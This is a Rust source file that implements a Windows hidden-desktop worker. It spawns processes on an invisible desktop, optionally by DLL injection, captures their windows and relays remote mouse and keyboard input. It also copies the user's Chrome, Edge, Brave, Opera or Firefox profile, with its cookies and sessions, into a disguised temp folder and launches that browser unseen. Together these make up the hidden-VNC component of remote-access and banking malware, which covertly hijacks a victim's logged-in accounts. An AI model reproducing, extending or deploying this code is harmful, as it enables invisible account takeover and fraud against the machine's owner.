//! Hidden desktop and hidden-browser capture worker.
//!
//! A dedicated thread is attached to a private desktop. Processes started
//! there are invisible to the interactive session; their windows are rendered
//! with `PrintWindow(PW_RENDERFULLCONTENT)` and composited into one RGB frame.

use std::{
    collections::HashMap,
    ffi::c_void,
    sync::{
        Arc, LazyLock, Mutex, mpsc,
    },
    thread,
    time::Duration,
};

use windows_sys::Win32::{
    Foundation::{BOOL, CloseHandle, HWND, LPARAM, POINT, RECT, SIZE},
    Graphics::{
        Dwm::{
            DwmQueryThumbnailSourceSize, DwmRegisterThumbnail, DwmUnregisterThumbnail,
            DwmUpdateThumbnailProperties, DWM_THUMBNAIL_PROPERTIES, DWM_TNP_RECTDESTINATION,
            DWM_TNP_RECTSOURCE, DWM_TNP_VISIBLE,
        },
        Gdi::{
            BitBlt, CreateCompatibleDC, CreateDIBSection, DeleteDC, DeleteObject, GdiFlush, GetDC,
            ReleaseDC, ScreenToClient, SelectObject, UpdateWindow, BITMAPINFO, BITMAPINFOHEADER, BI_RGB,
            DIB_RGB_COLORS, HDC, SRCCOPY,
        },
    },
    Storage::Xps::PrintWindow,
    System::{
        StationsAndDesktops::{
            CloseDesktop, CreateDesktopW, OpenDesktopW, SetThreadDesktop, HDESK,
        },
        Threading::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW},
    },
    UI::{
        Input::KeyboardAndMouse::{SetActiveWindow, SetFocus},
        WindowsAndMessaging::{
            CreateWindowExW, DestroyWindow, EnumWindows, GetForegroundWindow, GetWindowRect,
            GetWindowTextW, GetWindowThreadProcessId, IsWindowVisible, PostMessageW,
            SetForegroundWindow, SetWindowPos, ShowWindow, WindowFromPoint,
            HWND_BOTTOM, SWP_NOACTIVATE, SWP_SHOWWINDOW, SW_SHOWNOACTIVATE, WM_CHAR, WM_KEYDOWN,
            WM_KEYUP, WM_LBUTTONDOWN, WM_LBUTTONUP, WM_MBUTTONDOWN, WM_MBUTTONUP, WM_MOUSEMOVE,
            WM_MOUSEWHEEL, WM_RBUTTONDOWN, WM_RBUTTONUP, WS_DISABLED, WS_EX_NOACTIVATE,
            WS_EX_TOOLWINDOW, WS_EX_TRANSPARENT, WS_POPUP, WS_VISIBLE,
        },
    },
};

const DESKTOP_ALL_ACCESS: u32 = 0x000F_01FF;
const PW_RENDERFULLCONTENT: u32 = 2;
const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
const MK_LBUTTON: usize = 0x0001;
const MK_RBUTTON: usize = 0x0002;
const MK_MBUTTON: usize = 0x0010;

pub struct Frame {
    pub width: i32,
    pub height: i32,
    pub pixels: Vec<u8>,
    pub bgra: bool,
    pub cursor: Option<(i32, i32, bool)>,
}

pub struct WindowEntry {
    pub title: String,
    pub x: i32,
    pub y: i32,
    pub width: i32,
    pub height: i32,
    pub pid: u32,
    pub process_name: String,
}

pub struct MonitorEntry {
    pub index: usize,
    pub name: String,
    pub x: i32,
    pub y: i32,
    pub width: i32,
    pub height: i32,
    pub primary: bool,
}

enum Task {
    Capture {
        display: usize,
        reply: mpsc::Sender<Result<Frame, String>>,
    },
    Start {
        path: String,
        args: String,
        inject: Option<Vec<u8>>,
        reply: mpsc::Sender<Result<u32, String>>,
    },
    MouseMove {
        x: i32,
        y: i32,
    },
    MouseButton {
        button: i64,
        down: bool,
    },
    Wheel {
        delta: i32,
    },
    Key {
        vk: u16,
        text: Option<String>,
        down: bool,
    },
    WindowList {
        reply: mpsc::Sender<(Vec<WindowEntry>, Vec<MonitorEntry>)>,
    },
    KillAll {
        reply: mpsc::Sender<()>,
    },
    Shutdown {
        reply: mpsc::Sender<()>,
    },
}

struct HiddenDesktop {
    handle: usize,
    tx: mpsc::Sender<Task>,
}

static HIDDEN: LazyLock<Mutex<Option<HiddenDesktop>>> = LazyLock::new(|| Mutex::new(None));

struct Surface {
    dc: HDC,
    bitmap: isize,
    bits: *mut u8,
    width: i32,
    height: i32,
}

impl Surface {
    fn new(screen: HDC, width: i32, height: i32) -> Option<Self> {
        if width <= 0 || height <= 0 {
            return None;
        }
        unsafe {
            let dc = CreateCompatibleDC(screen);
            if dc.is_null() {
                return None;
            }
            let mut info: BITMAPINFO = std::mem::zeroed();
            info.bmiHeader = BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -height,
                biPlanes: 1,
                biBitCount: 32,
                biCompression: BI_RGB,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            };
            let mut bits: *mut c_void = std::ptr::null_mut();
            let bitmap = CreateDIBSection(
                dc,
                &info,
                DIB_RGB_COLORS,
                &mut bits,
                std::ptr::null_mut(),
                0,
            );
            if bitmap.is_null() || bits.is_null() {
                DeleteDC(dc);
                return None;
            }
            SelectObject(dc, bitmap);
            Some(Self {
                dc,
                bitmap: bitmap as isize,
                bits: bits as *mut u8,
                width,
                height,
            })
        }
    }
}

impl Drop for Surface {
    fn drop(&mut self) {
        unsafe {
            DeleteObject(self.bitmap as *mut c_void);
            DeleteDC(self.dc);
        }
    }
}

struct Thumbnail {
    handle: isize,
    width: i32,
    height: i32,
}

struct DwmState {
    host: HWND,
    bounds: (i32, i32, i32, i32),
    thumbnails: HashMap<isize, Thumbnail>,
}

impl Drop for DwmState {
    fn drop(&mut self) {
        unsafe {
            for (_, thumbnail) in self.thumbnails.drain() {
                DwmUnregisterThumbnail(thumbnail.handle);
            }
            DestroyWindow(self.host);
        }
    }
}

fn ensure_dwm_host(state: &mut Option<DwmState>, bounds: (i32, i32, i32, i32)) -> bool {
    if let Some(existing) = state.as_mut() {
        if existing.bounds == bounds {
            return true;
        }
        existing.bounds = bounds;
        unsafe {
            SetWindowPos(
                existing.host,
                HWND_BOTTOM,
                bounds.0,
                bounds.1,
                bounds.2,
                bounds.3,
                SWP_NOACTIVATE | SWP_SHOWWINDOW,
            );
        }
        return true;
    }
    let class = super::wide("Static");
    let host = unsafe {
        CreateWindowExW(
            WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
            class.as_ptr(),
            std::ptr::null(),
            WS_POPUP | WS_DISABLED | WS_VISIBLE,
            bounds.0,
            bounds.1,
            bounds.2,
            bounds.3,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };
    if host.is_null() {
        return false;
    }
    unsafe {
        ShowWindow(host, SW_SHOWNOACTIVATE);
        UpdateWindow(host);
        SetWindowPos(
            host,
            HWND_BOTTOM,
            bounds.0,
            bounds.1,
            bounds.2,
            bounds.3,
            SWP_NOACTIVATE | SWP_SHOWWINDOW,
        );
    }
    *state = Some(DwmState {
        host,
        bounds,
        thumbnails: HashMap::new(),
    });
    true
}

fn dwm_render(
    state: &mut Option<DwmState>,
    bounds: (i32, i32, i32, i32),
    target: HDC,
) -> bool {
    let started = std::time::Instant::now();
    if !ensure_dwm_host(state, bounds) {
        return false;
    }
    let Some(dwm) = state.as_mut() else {
        return false;
    };
    let (origin_x, origin_y, width, height) = bounds;
    let mut windows: Vec<HWND> = Vec::new();
    unsafe {
        EnumWindows(Some(enum_window), &mut windows as *mut Vec<HWND> as LPARAM);
    }
    windows.reverse();
    let mut candidates: Vec<(HWND, RECT)> = Vec::new();
    for window in windows {
        if window == dwm.host || unsafe { IsWindowVisible(window) } == 0 {
            continue;
        }
        let mut rect: RECT = unsafe { std::mem::zeroed() };
        if unsafe { GetWindowRect(window, &mut rect) } == 0 {
            continue;
        }
        let win_w = rect.right - rect.left;
        let win_h = rect.bottom - rect.top;
        if win_w <= 0 || win_h <= 0 {
            continue;
        }
        if rect.right <= origin_x
            || rect.left >= origin_x + width
            || rect.bottom <= origin_y
            || rect.top >= origin_y + height
        {
            continue;
        }
        candidates.push((window, rect));
    }
    if candidates.is_empty() {
        return false;
    }
    let alive: Vec<isize> = candidates.iter().map(|(window, _)| *window as isize).collect();
    let stale: Vec<isize> = dwm
        .thumbnails
        .keys()
        .copied()
        .filter(|key| !alive.contains(key))
        .collect();
    for key in stale {
        if let Some(thumbnail) = dwm.thumbnails.remove(&key) {
            unsafe {
                DwmUnregisterThumbnail(thumbnail.handle);
            }
        }
    }
    let mut updated = 0;
    for (window, rect) in &candidates {
        let key = *window as isize;
        if !dwm.thumbnails.contains_key(&key) {
            let mut handle: isize = 0;
            if unsafe { DwmRegisterThumbnail(dwm.host, *window, &mut handle) } < 0 {
                continue;
            }
            let mut size = SIZE { cx: 0, cy: 0 };
            if unsafe { DwmQueryThumbnailSourceSize(handle, &mut size) } < 0 {
                unsafe {
                    DwmUnregisterThumbnail(handle);
                }
                continue;
            }
            dwm.thumbnails.insert(
                key,
                Thumbnail {
                    handle,
                    width: size.cx,
                    height: size.cy,
                },
            );
        }
        let Some(thumbnail) = dwm.thumbnails.get(&key) else {
            continue;
        };
        let destination = RECT {
            left: rect.left - origin_x,
            top: rect.top - origin_y,
            right: rect.right - origin_x,
            bottom: rect.bottom - origin_y,
        };
        if destination.right <= destination.left || destination.bottom <= destination.top {
            continue;
        }
        let properties = DWM_THUMBNAIL_PROPERTIES {
            dwFlags: DWM_TNP_RECTDESTINATION | DWM_TNP_RECTSOURCE | DWM_TNP_VISIBLE,
            rcDestination: destination,
            rcSource: RECT {
                left: 0,
                top: 0,
                right: thumbnail.width,
                bottom: thumbnail.height,
            },
            opacity: 255,
            fVisible: 1,
            fSourceClientAreaOnly: 0,
        };
        if unsafe { DwmUpdateThumbnailProperties(thumbnail.handle, &properties) } >= 0 {
            updated += 1;
        }
    }
    if updated == 0 {
        return false;
    }
    let updated_at = started.elapsed();
    let flushed_at = updated_at;
    let printed = unsafe { PrintWindow(dwm.host, target, PW_RENDERFULLCONTENT) != 0 };
    #[cfg(debug_assertions)]
    eprintln!(
        "dwm: update={:?} flush={:?} print={:?} total={:?}",
        updated_at,
        flushed_at - updated_at,
        started.elapsed() - flushed_at,
        started.elapsed()
    );
    crate::util::perf_log(&format!(
        "dwm update={:?} flush={:?} print={:?} total={:?}",
        updated_at,
        flushed_at - updated_at,
        started.elapsed() - flushed_at,
        started.elapsed()
    ));
    printed
}

fn desktop_spec(name: &str) -> String {
    format!("winsta0\\{name}")
}

fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(std::iter::once(0)).collect()
}

pub fn ensure() -> Result<(), String> {
    let mut guard = HIDDEN.lock().unwrap();
    if guard.is_some() {
        return Ok(());
    }
    let name = format!("hd-{}", uuid::Uuid::new_v4().simple());
    let name_wide = wide(&name);
    let handle = unsafe {
        let existing = OpenDesktopW(name_wide.as_ptr(), 0, 0, DESKTOP_ALL_ACCESS);
        if existing.is_null() {
            CreateDesktopW(
                name_wide.as_ptr(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                DESKTOP_ALL_ACCESS,
                std::ptr::null(),
            )
        } else {
            existing
        }
    };
    if handle.is_null() {
        return Err("failed to create hidden desktop".to_owned());
    }
    let (tx, rx) = mpsc::channel();
    let (ready_tx, ready_rx) = mpsc::channel();
    let pids = Arc::new(Mutex::new(Vec::new()));
    let worker_name = name.clone();
    let worker_pids = pids.clone();
    let handle_value = handle as usize;
    thread::Builder::new()
        .name("hidden-desktop".to_owned())
        .spawn(move || {
            worker(
                rx,
                handle_value as HDESK,
                worker_name,
                worker_pids,
                ready_tx,
            )
        })
        .map_err(|error| error.to_string())?;
    match ready_rx.recv_timeout(Duration::from_secs(5)) {
        Ok(Ok(())) => {}
        Ok(Err(error)) => {
            unsafe { CloseDesktop(handle) };
            return Err(error);
        }
        Err(_) => {
            unsafe { CloseDesktop(handle) };
            return Err("hidden desktop worker did not start".to_owned());
        }
    }
    *guard = Some(HiddenDesktop {
        handle: handle as usize,
        tx,
    });
    Ok(())
}

fn worker(
    rx: mpsc::Receiver<Task>,
    handle: HDESK,
    name: String,
    pids: Arc<Mutex<Vec<u32>>>,
    ready: mpsc::Sender<Result<(), String>>,
) {
    unsafe {
        if SetThreadDesktop(handle) == 0 {
            let _ = ready.send(Err("failed to attach hidden desktop".to_owned()));
            return;
        }
    }
    let _ = ready.send(Ok(()));
    let mut caches: HashMap<isize, Surface> = HashMap::new();
    let mut dwm: Option<DwmState> = None;
    let mut full_cache: Option<Surface> = None;
    let mut cursor = POINT { x: 0, y: 0 };
    let mut buttons: usize = 0;
    let spec = desktop_spec(&name);

    while let Ok(task) = rx.recv() {
        match task {
            Task::Capture { display, reply } => {
                let result = capture(display, &mut caches, cursor, &mut dwm, &mut full_cache);
                let _ = reply.send(result);
            }
            Task::Start {
                path,
                args,
                inject,
                reply,
            } => {
                let result = if let Some(dll) = inject {
                    super::inject::inject(&path, &args, &dll, Some(&spec))
                        .or_else(|_| spawn_on_desktop(&spec, &path, &args))
                } else {
                    spawn_on_desktop(&spec, &path, &args)
                };
                if let Ok(pid) = &result {
                    pids.lock().unwrap().push(*pid);
                }
                let _ = reply.send(result);
            }
            Task::MouseMove { x, y } => {
                cursor = POINT { x, y };
                if let Some(window) = window_at(cursor) {
                    let mut client = cursor;
                    unsafe {
                        ScreenToClient(window, &mut client);
                    }
                    let lparam = make_lparam(client.x, client.y);
                    unsafe {
                        PostMessageW(window, WM_MOUSEMOVE, buttons, lparam);
                    }
                }
            }
            Task::MouseButton { button, down } => {
                if let Some(window) = window_at(cursor) {
                    if down {
                        unsafe {
                            SetForegroundWindow(window);
                            SetActiveWindow(window);
                            SetFocus(window);
                        }
                    }
                    let mut client = cursor;
                    unsafe {
                        ScreenToClient(window, &mut client);
                    }
                    let lparam = make_lparam(client.x, client.y);
                    let (message, flag) = match (button, down) {
                        (1, true) => (WM_MBUTTONDOWN, MK_MBUTTON),
                        (1, false) => (WM_MBUTTONUP, 0),
                        (2, true) => (WM_RBUTTONDOWN, MK_RBUTTON),
                        (2, false) => (WM_RBUTTONUP, 0),
                        (_, true) => (WM_LBUTTONDOWN, MK_LBUTTON),
                        (_, false) => (WM_LBUTTONUP, 0),
                    };
                    let released = match button {
                        1 => MK_MBUTTON,
                        2 => MK_RBUTTON,
                        _ => MK_LBUTTON,
                    };
                    if down {
                        buttons |= flag;
                    } else {
                        buttons &= !released;
                    }
                    unsafe {
                        PostMessageW(window, message, flag, lparam);
                    }
                }
            }
            Task::Wheel { delta } => {
                if let Some(window) = window_at(cursor) {
                    let wparam = (delta as u16 as usize) << 16;
                    let lparam = make_lparam(cursor.x, cursor.y);
                    unsafe {
                        PostMessageW(window, WM_MOUSEWHEEL, wparam, lparam);
                    }
                }
            }
            Task::Key { vk, text, down } => {
                let window = window_at(cursor)
                    .or_else(foreground_window)
                    .or_else(any_visible_window);
                let Some(window) = window else { continue };
                if down {
                    unsafe {
                        SetForegroundWindow(window);
                        SetActiveWindow(window);
                        SetFocus(window);
                    }
                }
                if down {
                    let text = text.unwrap_or_default();
                    if !text.is_empty() {
                        for unit in text.encode_utf16() {
                            if unit == 0 {
                                continue;
                            }
                            unsafe {
                                PostMessageW(window, WM_CHAR, unit as usize, 1);
                            }
                        }
                        continue;
                    }
                }
                unsafe {
                    PostMessageW(
                        window,
                        if down { WM_KEYDOWN } else { WM_KEYUP },
                        vk as usize,
                        1,
                    );
                }
            }
            Task::WindowList { reply } => {
                let _ = reply.send(window_list());
            }
            Task::KillAll { reply } => {
                let tracked = pids.lock().map(|pids| pids.clone()).unwrap_or_default();
                if !tracked.is_empty() {
                    let processes = super::process::list();
                    let mut tree: std::collections::HashSet<u32> = tracked.iter().copied().collect();
                    loop {
                        let mut changed = false;
                        for process in &processes {
                            if tree.contains(&process.ppid) && tree.insert(process.pid) {
                                changed = true;
                            }
                        }
                        if !changed {
                            break;
                        }
                    }
                    for pid in &tree {
                        let _ = super::process::kill(*pid);
                    }
                }
                if let Ok(mut pids) = pids.lock() {
                    pids.clear();
                }
                let _ = reply.send(());
            }
            Task::Shutdown { reply } => {
                let _ = reply.send(());
                dwm.take();
                full_cache.take();
                break;
            }
        }
    }
    caches.clear();
}

fn spawn_on_desktop(spec: &str, path: &str, args: &str) -> Result<u32, String> {
    if path.trim().is_empty() {
        return Err("empty application path".to_owned());
    }
    let application = wide(path);
    let command = if args.trim().is_empty() {
        path.to_owned()
    } else {
        format!("{path} {args}")
    };
    let mut command_wide = wide(&command);
    let mut desktop = wide(spec);
    let mut startup: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    startup.lpDesktop = desktop.as_mut_ptr();
    let mut process: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let created = unsafe {
        CreateProcessW(
            application.as_ptr(),
            command_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_NEW_CONSOLE,
            std::ptr::null(),
            std::ptr::null(),
            &startup,
            &mut process,
        )
    };
    if created == 0 {
        return Err("CreateProcess on hidden desktop failed".to_owned());
    }
    unsafe {
        CloseHandle(process.hThread);
        CloseHandle(process.hProcess);
    }
    Ok(process.dwProcessId)
}

fn capture(
    display: usize,
    caches: &mut HashMap<isize, Surface>,
    cursor: POINT,
    dwm: &mut Option<DwmState>,
    full_cache: &mut Option<Surface>,
) -> Result<Frame, String> {
    let (origin_x, origin_y, width, height) = super::screen::display_origin(display);
    if width <= 0 || height <= 0 {
        return Err("invalid display bounds".to_owned());
    }
    unsafe {
        let screen = GetDC(std::ptr::null_mut());
        if screen.is_null() {
            return Err("GetDC failed".to_owned());
        }
        let full = match full_cache.take() {
            Some(surface) if surface.width == width && surface.height == height => surface,
            _ => Surface::new(screen, width, height)
                .ok_or_else(|| "surface creation failed".to_owned())?,
        };
        let mut drawn = 0;
        if dwm_render(dwm, (origin_x, origin_y, width, height), full.dc) {
            drawn = 1;
        } else {
            for pixel in
                std::slice::from_raw_parts_mut(full.bits, (width * height * 4) as usize)
                    .chunks_exact_mut(4)
            {
                pixel[0] = 0;
                pixel[1] = 0;
                pixel[2] = 0;
                pixel[3] = 255;
            }
        }
        let mut windows: Vec<HWND> = Vec::new();
        if drawn == 0 {
            EnumWindows(Some(enum_window), &mut windows as *mut Vec<HWND> as LPARAM);
        }
        #[cfg(debug_assertions)]
        eprintln!("hidden capture: {} top-level windows", windows.len());
        let mut alive: Vec<isize> = Vec::with_capacity(windows.len());
        for window in windows.into_iter().rev() {
            let key = window as isize;
            alive.push(key);
            if IsWindowVisible(window) == 0 {
                continue;
            }
            let mut rect: RECT = std::mem::zeroed();
            if GetWindowRect(window, &mut rect) == 0 {
                continue;
            }
            let win_w = rect.right - rect.left;
            let win_h = rect.bottom - rect.top;
            if win_w <= 0 || win_h <= 0 {
                continue;
            }
            if rect.right <= origin_x
                || rect.left >= origin_x + width
                || rect.bottom <= origin_y
                || rect.top >= origin_y + height
            {
                continue;
            }
            let key_size = (win_w, win_h);
            let needs_new = match caches.get(&key) {
                Some(surface) => surface.width != key_size.0 || surface.height != key_size.1,
                None => true,
            };
            if needs_new {
                caches.remove(&key);
                if let Some(surface) = Surface::new(screen, win_w, win_h) {
                    caches.insert(key, surface);
                } else {
                    continue;
                }
            }
            let Some(surface) = caches.get(&key) else { continue };
            let printed = PrintWindow(window, surface.dc, PW_RENDERFULLCONTENT);
            if printed == 0 {
                continue;
            }
            let source_x = (origin_x - rect.left).max(0);
            let source_y = (origin_y - rect.top).max(0);
            let destination_x = (rect.left - origin_x).max(0);
            let destination_y = (rect.top - origin_y).max(0);
            let copy_w = (win_w - source_x)
                .min(width - destination_x)
                .min(win_w);
            let copy_h = (win_h - source_y)
                .min(height - destination_y)
                .min(win_h);
            if copy_w <= 0 || copy_h <= 0 {
                continue;
            }
            let copied = BitBlt(
                full.dc,
                destination_x,
                destination_y,
                copy_w,
                copy_h,
                surface.dc,
                source_x,
                source_y,
                SRCCOPY,
            );
            if copied != 0 {
                drawn += 1;
            }
        }

        // Drop cache entries for windows that no longer exist.
        caches.retain(|key, _| alive.contains(key));

        #[cfg(debug_assertions)]
        eprintln!("hidden capture: drawn={drawn} bounds={origin_x},{origin_y} {width}x{height}");
        if drawn == 0 {
            BitBlt(
                full.dc,
                0,
                0,
                width,
                height,
                screen,
                origin_x,
                origin_y,
                SRCCOPY,
            );
        }

        GdiFlush();
        let pixels = std::slice::from_raw_parts(full.bits, (width * height * 4) as usize).to_vec();
        ReleaseDC(std::ptr::null_mut(), screen);
        *full_cache = Some(full);
        Ok(Frame {
            width,
            height,
            pixels,
            bgra: true,
            cursor: Some((cursor.x, cursor.y, true)),
        })
    }
}

unsafe extern "system" fn enum_window(window: HWND, data: LPARAM) -> BOOL {
    let list = &mut *(data as *mut Vec<HWND>);
    list.push(window);
    1
}

fn make_lparam(x: i32, y: i32) -> isize {
    ((y as u16 as isize) << 16) | (x as u16 as isize)
}

fn window_at(point: POINT) -> Option<HWND> {
    let window = unsafe { WindowFromPoint(point) };
    (!window.is_null()).then_some(window)
}

fn foreground_window() -> Option<HWND> {
    let window = unsafe { GetForegroundWindow() };
    (!window.is_null()).then_some(window)
}

fn any_visible_window() -> Option<HWND> {
    struct State {
        found: Option<HWND>,
    }
    unsafe extern "system" fn callback(window: HWND, data: LPARAM) -> BOOL {
        if IsWindowVisible(window) != 0 {
            let state = &mut *(data as *mut State);
            state.found = Some(window);
            return 0;
        }
        1
    }
    let mut state = State { found: None };
    unsafe {
        EnumWindows(Some(callback), &mut state as *mut State as LPARAM);
    }
    state.found
}

fn window_list() -> (Vec<WindowEntry>, Vec<MonitorEntry>) {
    let names: HashMap<u32, String> = super::process::list()
        .into_iter()
        .map(|process| (process.pid, process.name))
        .collect();
    struct State {
        entries: Vec<WindowEntry>,
        names: HashMap<u32, String>,
    }
    unsafe extern "system" fn callback(window: HWND, data: LPARAM) -> BOOL {
        if IsWindowVisible(window) == 0 {
            return 1;
        }
        let mut title = [0u16; 512];
        let length = GetWindowTextW(window, title.as_mut_ptr(), title.len() as i32);
        if length <= 0 {
            return 1;
        }
        let mut rect: RECT = std::mem::zeroed();
        if GetWindowRect(window, &mut rect) == 0 {
            return 1;
        }
        let width = rect.right - rect.left;
        let height = rect.bottom - rect.top;
        if width < 40 || height < 40 {
            return 1;
        }
        let mut pid = 0u32;
        GetWindowThreadProcessId(window, &mut pid);
        let state = &mut *(data as *mut State);
        let process_name = state.names.get(&pid).cloned().unwrap_or_default();
        state.entries.push(WindowEntry {
            title: String::from_utf16_lossy(&title[..length as usize]),
            x: rect.left,
            y: rect.top,
            width,
            height,
            pid,
            process_name,
        });
        1
    }
    let mut state = State {
        entries: Vec::new(),
        names,
    };
    unsafe {
        EnumWindows(Some(callback), &mut state as *mut State as LPARAM);
    }
    let monitors = super::screen::monitors()
        .into_iter()
        .map(|monitor| MonitorEntry {
            index: monitor.index,
            name: format!("Display {}", monitor.index + 1),
            x: monitor.x,
            y: monitor.y,
            width: monitor.width,
            height: monitor.height,
            primary: monitor.primary,
        })
        .collect();
    (state.entries, monitors)
}

pub fn capture_display(display: usize) -> Result<Frame, String> {
    ensure()?;
    let sender = HIDDEN
        .lock()
        .unwrap()
        .as_ref()
        .map(|hidden| hidden.tx.clone())
        .ok_or_else(|| "hidden desktop unavailable".to_owned())?;
    let (reply, receiver) = mpsc::channel();
    sender
        .send(Task::Capture { display, reply })
        .map_err(|_| "hidden desktop worker stopped".to_owned())?;
    receiver
        .recv_timeout(Duration::from_secs(15))
        .map_err(|_| "hidden capture timed out".to_owned())?
}

pub fn start_process(path: &str, args: &str, inject: Option<Vec<u8>>) -> Result<u32, String> {
    ensure()?;
    let sender = HIDDEN
        .lock()
        .unwrap()
        .as_ref()
        .map(|hidden| hidden.tx.clone())
        .ok_or_else(|| "hidden desktop unavailable".to_owned())?;
    let (reply, receiver) = mpsc::channel();
    sender
        .send(Task::Start {
            path: path.to_owned(),
            args: args.to_owned(),
            inject,
            reply,
        })
        .map_err(|_| "hidden desktop worker stopped".to_owned())?;
    receiver
        .recv_timeout(Duration::from_secs(30))
        .map_err(|_| "hidden process start timed out".to_owned())?
}

pub fn mouse_move(x: i32, y: i32) {
    if let Some(sender) = sender() {
        let _ = sender.send(Task::MouseMove { x, y });
    }
}

pub fn mouse_button(button: i64, down: bool) {
    if let Some(sender) = sender() {
        let _ = sender.send(Task::MouseButton { button, down });
    }
}

pub fn mouse_wheel(delta: i32) {
    if let Some(sender) = sender() {
        let _ = sender.send(Task::Wheel { delta });
    }
}

pub fn key(vk: u16, text: Option<String>, down: bool) {
    if let Some(sender) = sender() {
        let _ = sender.send(Task::Key { vk, text, down });
    }
}

pub fn window_list_sync() -> (Vec<WindowEntry>, Vec<MonitorEntry>) {
    let Some(sender) = sender() else {
        return (Vec::new(), Vec::new());
    };
    let (reply, receiver) = mpsc::channel();
    if sender.send(Task::WindowList { reply }).is_err() {
        return (Vec::new(), Vec::new());
    }
    receiver.recv_timeout(Duration::from_secs(10)).unwrap_or_default()
}

pub fn kill_all() {
    let Some(sender) = sender() else { return };
    let (reply, receiver) = mpsc::channel();
    let _ = sender.send(Task::KillAll { reply });
    let _ = receiver.recv_timeout(Duration::from_secs(10));
}

pub fn stop() {
    let hidden = HIDDEN.lock().unwrap().take();
    if let Some(hidden) = hidden {
        let (reply, receiver) = mpsc::channel();
        let _ = hidden.tx.send(Task::Shutdown { reply });
        if receiver.recv_timeout(Duration::from_secs(5)).is_ok() {
            unsafe {
                CloseDesktop(hidden.handle as HDESK);
            }
        }
    }
}

pub fn is_active() -> bool {
    HIDDEN.lock().map(|guard| guard.is_some()).unwrap_or(false)
}

fn sender() -> Option<mpsc::Sender<Task>> {
    HIDDEN
        .lock()
        .ok()
        .and_then(|guard| guard.as_ref().map(|hidden| hidden.tx.clone()))
}

pub fn browser_data_dir(browser: &str) -> Option<std::path::PathBuf> {
    let local = std::env::var_os("LOCALAPPDATA").map(std::path::PathBuf::from)?;
    let roaming = std::env::var_os("APPDATA").map(std::path::PathBuf::from)?;
    let path = match browser.to_ascii_lowercase().as_str() {
        "chrome" => local.join("Google").join("Chrome").join("User Data"),
        "edge" => local.join("Microsoft").join("Edge").join("User Data"),
        "brave" => local.join("BraveSoftware").join("Brave-Browser").join("User Data"),
        "opera" => roaming.join("Opera Software").join("Opera Stable"),
        "firefox" => {
            let profiles = roaming.join("Mozilla").join("Firefox").join("Profiles");
            let mut selected = None;
            if let Ok(entries) = std::fs::read_dir(&profiles) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() && path.join("prefs.js").exists() {
                        let name = path.file_name().unwrap_or_default().to_string_lossy().to_lowercase();
                        if name.contains("default-release") {
                            return Some(path);
                        }
                        if selected.is_none() {
                            selected = Some(path);
                        }
                    }
                }
            }
            selected.unwrap_or(profiles)
        }
        _ => return None,
    };
    path.exists().then_some(path)
}

pub fn clone_profile(browser: &str, source: &std::path::Path, lite: bool) -> Result<std::path::PathBuf, String> {
    let destination = std::env::temp_dir()
        .join("Microsoft")
        .join(format!("{browser}-{}", uuid::Uuid::new_v4().simple()));
    std::fs::create_dir_all(&destination).map_err(|error| error.to_string())?;
    copy_tree(source, &destination, lite, 0)?;
    Ok(destination)
}

fn copy_tree(
    source: &std::path::Path,
    destination: &std::path::Path,
    lite: bool,
    depth: usize,
) -> Result<(), String> {
    if depth > 12 {
        return Ok(());
    }
    let entries = std::fs::read_dir(source).map_err(|error| error.to_string())?;
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let lower = name.to_ascii_lowercase();
        if lower == "lockfile"
            || lower == "singletonlock"
            || lower == "singletoncookie"
            || lower == "singletonsocket"
            || (lite && (lower == "extensions" || lower == "cache" || lower == "code cache"))
        {
            continue;
        }
        let path = entry.path();
        let target = destination.join(&name);
        match entry.file_type() {
            Ok(kind) if kind.is_dir() => {
                std::fs::create_dir_all(&target).map_err(|error| error.to_string())?;
                copy_tree(&path, &target, lite, depth + 1)?;
            }
            Ok(kind) if kind.is_file() => {
                if let Err(error) = std::fs::copy(&path, &target) {
                    let _ = error;
                }
            }
            _ => {}
        }
    }
    Ok(())
}

pub fn browser_arguments(browser: &str, profile: &std::path::Path) -> String {
    match browser.to_ascii_lowercase().as_str() {
        "firefox" => format!("-profile \"{}\"", profile.display()),
        _ => format!(
            "--user-data-dir=\"{}\" --no-first-run --no-default-browser-check --disable-session-crashed-bubble \
--disable-backgrounding-occluded-windows \
--disable-renderer-backgrounding --disable-background-timer-throttling \
--disable-features=CalculateNativeWinOcclusion",
            profile.display()
        ),
    }
}
